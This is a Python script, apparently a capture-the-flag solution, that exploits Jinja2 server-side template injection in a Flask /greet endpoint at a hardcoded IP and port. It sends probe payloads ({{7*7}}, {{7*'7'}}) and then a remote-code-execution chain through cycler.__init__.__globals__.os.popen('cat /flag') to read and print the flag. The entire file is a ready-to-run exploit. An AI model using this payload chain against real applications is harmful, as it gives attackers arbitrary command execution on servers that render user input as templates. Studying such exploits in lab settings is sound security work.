#!/usr/bin/env python3
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
Q38 - 综合 · Jinja2 SSTI 一键拿 flag
靶机: http://47.120.76.57:34964/greet?name=<payload>
原理: Flask render_template_string 把用户输入拼进模板源码 -> Jinja2 表达式被服务端执行
利用链: cycler.__init__.__globals__.os.popen('cat /flag').read()
"""
import re
import sys
import urllib.parse
import urllib.request

BASE = "http://47.120.76.57:34964"


def send(payload: str) -> str:
    """把 payload 作为 name 参数发到 /greet，返回响应 body。"""
    url = f"{BASE}/greet?name=" + urllib.parse.quote(payload, safe="")
    with urllib.request.urlopen(url, timeout=10) as r:
        return r.read().decode("utf-8", "replace")


def extract(body: str) -> str:
    """从 'Hello, XXX!' 里抠出 XXX。"""
    m = re.search(r"Hello,\s*(.*?)\s*!</h2>", body, re.S)
    return m.group(1) if m else body.strip()


def main() -> int:
    # 1. SSTI 探针: 数字相乘被执行 => 模板注入
    p1 = extract(send("{{7*7}}"))
    print(f"[probe] {{{{7*7}}}}     -> {p1}")
    assert p1 == "49", "未检测到 SSTI"

    # 2. 指纹: 字符串 * 整数 = 字符串复制 => Python/Jinja2
    p2 = extract(send("{{7*'7'}}"))
    print(f"[probe] {{{{7*'7'}}}}   -> {p2}")
    assert p2 == "7777777", "不是 Jinja2"

    # 3. RCE: cycler 三跳到 os.popen
    payload = "{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}"
    flag = extract(send(payload)).strip()
    print(f"[rce  ] cycler chain  -> {flag}")

    m = re.search(r"TOGOGO-flag\{[^}]+\}", flag)
    if not m:
        print("[!] 未匹配到 flag 格式", file=sys.stderr)
        return 1
    print(f"\n[+] FLAG: {m.group(0)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
